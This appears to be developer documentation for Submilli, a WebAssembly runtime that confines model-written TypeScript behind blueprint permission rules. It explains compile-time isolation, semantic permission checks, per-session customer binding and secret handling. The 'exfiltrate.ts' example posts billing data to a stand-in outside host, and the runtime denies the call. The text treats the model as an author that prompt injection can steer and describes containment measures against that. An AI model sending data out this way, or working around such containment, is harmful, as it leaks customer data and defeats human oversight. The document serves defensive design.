---
title: "How Submilli works"
description: Why a program written by a model can't act outside its blueprint, and why Submilli is a new runtime for TypeScript.
slug: old/how-submilli-works
pagefind: false
sidebar:
  hidden: true
  order: 3
---

In the quickstart, the runtime denied one call. That shows a rule fired; it
doesn't show that the program had no other route to the same data. This chapter
explains why there is no other route, and what that guarantee depends on.

Most of Submilli's design follows from one fact: a model writes the program.

- **The author can't be trusted.** Whatever the model reads can steer what it
  writes, so every limit has to be enforced where the model's code can't reach.
- **The author isn't a human developer.** It writes the whole program in one
  attempt, can't open a debugger, and pays a model turn for every retry.

## What happens to a program

Your application, or your agent framework, sends the server three things: the
program's source, the name of a blueprint, and values for the blueprint's
variables. The server then does four things.

1. **Compile.** The server parses and type-checks the source and compiles it to
   WebAssembly, a binary format designed for running code in isolation. A
   program with a type error never starts. Generated programs are compiled on
   every request; packages are compiled once, when you install them.
2. **Create an instance.** Each run gets its own instance and memory, and sees
   nothing left by an earlier run, apart from the file area or session state a
   blueprint can grant ([crafting a blueprint](/docs/old/blueprints)).
3. **Run `main`.** The program runs inside the server process. Whenever it calls
   an operation that touches the outside world, the runtime consults the
   blueprint first.
4. **Return.** The value `main` returns is the result. A successful run returns
   only that value; the logs stay on the server for the framework to fetch with
   another tool call. A failed run returns the error and the logs.

Steps 1 and 3 carry the guarantees. The following sections explain them.

## Generated code reaches the outside only through operations

A WebAssembly program can reach outside its instance only through functions its
host provides. Submilli's compiler gives generated code two sources of
functions: the packages your blueprint lists, and Submilli's standard library.
Nothing else resolves, so the routes a Node.js program would take fail at
compile time. A global `fetch` doesn't exist, and neither do Node's modules,
npm packages, or a package the blueprint doesn't list:

```text
error: unresolved identifier `fetch`
 --> <execute>:2:15
  |
1 | function main(): string {
2 |     const r = fetch("https://example.com/");
  |               ^^^^^
```

The standard library does include HTTP and file functions. Each one is an
operation with a capability name, such as `http.post`, checked against the
blueprint like a package's operation. The blueprint in this chapter has no
`http.post` rule for generated code and sets `default: deny`, so this program
compiles and then stops at the call:

```typescript title="exfiltrate.ts"
import { applyCredit } from "@acme/billing";
import { post } from "submilli:http";

function main(): string {
    const credit = applyCredit("cus_northwind", 1500);
    post("https://stripe-backup-eu.example.com/sync", JSON.stringify(credit));
    return `credited ${credit.amount} cents`;
}
```

```text
error: PermissionDeniedError: permission denied: caller=main capability=http.post: policy denied http.post for main.
```

:::security
Submilli checks whether the blueprint permits an operation before it opens a
connection or touches a file. A denied request is never sent, and generated code
cannot bypass the check.
:::

## Semantic security: rules about what an operation means

Suppose a support agent may add a goodwill credit to the current customer's
account. The billing request carries a customer ID and an amount, but a rule
about it needs to know what the request *does*: this operation adds a credit,
this field names the recipient. Allowing traffic to the billing service doesn't
express that.

Submilli calls this **semantic security**. The package author defines a
vocabulary of operations and the context needed to authorize them: for a billing
package, `acme.com/credits.apply` means applying a credit, and its context, the
fields the package passes to `check` when it asks permission, includes
`customerId` and `amount`. The blueprint states its rules in that vocabulary and
never has to interpret the billing API's URLs or request format. The meaning
comes from the trusted package, and Submilli enforces the rule; the model is
never asked to judge the request's intent.

### Blueprint variables narrow permission to the current customer

A **blueprint variable** lets the application narrow a permission to the
customer the agent is serving. You write one blueprint and bind a different
customer for each session:

```yaml title="blueprint.yaml (fragment)"
variables:
  customerId:
    required: true

default: deny

permissions:
  main:
  - capability: acme.com/credits.apply
    filter: customerId == ${vars.customerId}
    action: allow
```

On the left is the customer the program is asking to credit, supplied by the
package in the permission check. On the right is the customer the application
authorized for this session, taken from trusted context such as the signed-in
account and supplied outside the generated program. With `cus_northwind` bound,
a credit for `cus_initech` fails the rule even though applying credits is
allowed, and nothing the program does can change the binding.

### Context can include facts outside the request

Extend the rule: credits only for premium customers; a person handles the rest.
The request still carries only a customer ID and an amount. The package can look
up the missing fact before it asks:

```typescript title="package/src/lib.ts (fragment)"
/**
 * Add a goodwill credit to a customer's account.
 * @param customerId The customer's id in the billing system, such as `cus_northwind`.
 * @param amount The credit, in cents; must be positive.
 * @returns The credit as recorded.
 * @capability acme.com/credits.apply { customerId: string, customerClass: string, amount: number }
 */
export function applyCredit(customerId: string, amount: number): Credit {
    // The call names a customer. Whether that customer is premium is a fact
    // about the account, so the package looks it up before asking.
    const customerClass = lookUpClass(customerId);
    check("acme.com/credits.apply", { customerId, customerClass, amount });

    // In production, this would call the billing API.
    return { customerId, amount };
}
```

The fields passed to `check` can be arguments or facts the package found out,
and the blueprint tests them alike. With the filter extended to
`customerId == ${vars.customerId} and customerClass == "premium"`, a session
bound to a premium customer gets the credit, and one bound to a standard
customer passes the first test and fails the second:

```text
error: PermissionDeniedError: permission denied: caller=main capability=acme.com/credits.apply: policy denied acme.com/credits.apply for main.
  at applyCredit (@acme/billing/lib:31:39)  [thrown here]
30 |     const customerClass = lookUpClass(customerId);
31 |     check("acme.com/credits.apply", { customerId, customerClass, amount });
   |                                       ^
```

## Trusted code and untrusted code

Two kinds of code run inside one program: the packages you reviewed and
installed, and the code the model wrote a moment ago. The blueprint gives each
its own list of rules, `main` for the generated code and each package under its
own name.

```yaml title="blueprint.yaml (fragment)"
permissions:
  # What generated code may do.
  main:
  - capability: acme.com/credits.apply
    filter: customerId == ${vars.customerId} and customerClass == "premium"
    action: allow

  # What the package itself may do.
  '@acme/billing':
  - capability: http.get
    filter: host == "billing.internal.example.com"
    action: allow
```

Under this blueprint, generated code can't send a request to the billing host.
It can call `applyCredit`, and the package sends the request. The package's
function is the only form in which generated code can use the billing API. The
Submilli CLI generates these starter rules from a package's capability
declarations when you add it; you then narrow them with filters and variables.

The runtime knows which code is asking because the compiler stamps each compiled
module with its owner's name, `main` or the package's name, and the runtime
reads that name from the call stack. Code can't supply it. When `applyCredit`
calls `check`, the generated program's rules apply. When the package contacts
the billing service, its own rules apply. Generated code can't claim a package's
identity or inherit its permissions.

### Secrets and variables stay on the trusted side

Anything generated code can read, the model can be talked into repeating. That
holds for whatever an allowed operation returns; the blueprint decides what a
program may fetch, not what the model says afterwards. So credentials must be
unreadable altogether.

- A package reads a secret by name with `secrets.get`. The runtime refuses the
  same call from `main` whatever the blueprint says, even one that allows it.
  Generated code passes a package the *name* of a secret at most.
- When a blueprint lets generated code call an HTTP endpoint directly, Submilli's
  **auth proxy** adds the credential after the permission check, outside the
  program. The program sees the response, never the header.
- Blueprint variables are read only by rule evaluation. No function returns
  them, so generated code can't read the value it is held to or set one.

[Permissions](/docs/old/permissions) covers the rule syntax, and
[crafting a blueprint](/docs/old/blueprints) covers secrets and variables.

## An in-process sandbox instead of a virtual machine

A container or a small virtual machine gives untrusted code an operating
system: processes, a shell, a filesystem, a network stack. An agent that
installs dependencies or runs arbitrary binaries needs those, and Submilli is
the wrong tool for it. A program that calls a few tools, loops over the results,
and returns a summary needs none of them. Submilli runs it as a WebAssembly
instance inside the server process: starting a run means compiling a short
program and creating an instance, and ending it drops the instance and its
memory.

WebAssembly confines a program to its own memory and to the functions the host
provides, and Submilli provides only the standard library and your packages,
with no operating-system interface. The guarantee therefore depends on the
WebAssembly engine and on Submilli's host functions being correct. Each run is
also limited: by default 50 MB of memory, a bounded call stack, and an
instruction budget, and exceeding one stops the program with an error the model
can read ([resource limits](/docs/old/resource-limits)).

## A language the model already writes

The second fact about the author shapes the language. Submilli's choices aim at
a program that is right the first time, or that fails with enough information to
be right the second. The reasons below are design reasoning, not measurements.

**TypeScript, because models already write it.** A new language would have to be
taught in every prompt. Models have seen a great deal of TypeScript, types
included, so a short guide to the differences is enough.

**Types, because they catch mistakes before anything happens.** The compiler
rejects a program with a type error before it starts, so nothing is half done. A
failure midway is costlier: a program that applies a credit and then fails can't
be rerun without applying the credit twice. Submilli's subset has no `any`, and
a cast with `as` is checked at runtime, so a failed cast can still stop a
program after earlier operations ran ([the language](/docs/old/the-language)).

**Errors written to be fixed in one turn.** An error shows the source line,
marks the position, and includes what the fix needs. For a misspelled field,
that is the closest name and the type's declaration:

```text
error: field `amout` does not exist on `Credit`
 --> <execute>:5:31
  |
4 |     const credit = applyCredit("cus_northwind", 1500);
5 |     return `credited ${credit.amout} cents`;
  |                               ^^^^^
6 | }
  |
help: did you mean `amount`?
  |
help: /** A credit added to a customer's account. */
interface Credit {
  /** Amount in cents. */
  amount: number;
  /** The customer who received the credit. */
  customerId: string;
}
```

A permission denial is written for the same reader. It ends by telling the model
not to work around the denial, because a model otherwise treats a denial as an
obstacle and looks for another route.

**Documentation on request.** The model gets tools to search the available
packages and fetch one package's declarations and description, rather than every
package's documentation up front. The language guide arrives as the description
of the tool that runs code.

**The answer is a returned value.** The result is what `main` returns: a string
as written, a number or boolean as its text, an object or array as JSON text.
The model doesn't pick the answer out of log lines.

**Its own packages in place of npm.** Generated code can't import npm packages
or Node.js modules. An npm package contains no `check` calls, so a blueprint
would have nothing to govern, and Node's ecosystem keeps old interfaces working,
so most tasks can be done several ways, each a chance for a model to pick wrong.
Programs written fresh each run need no old interfaces, so a Submilli package
offers one typed way to do each thing. You pay by wrapping your systems as
packages; tool servers you already run over MCP, the protocol most agent
frameworks use to call tools, need no wrapping, because Submilli presents each
as a typed package ([using MCP servers](/docs/old/mcp-servers)).

Next: [the language](/docs/old/the-language), where you write programs of your own.
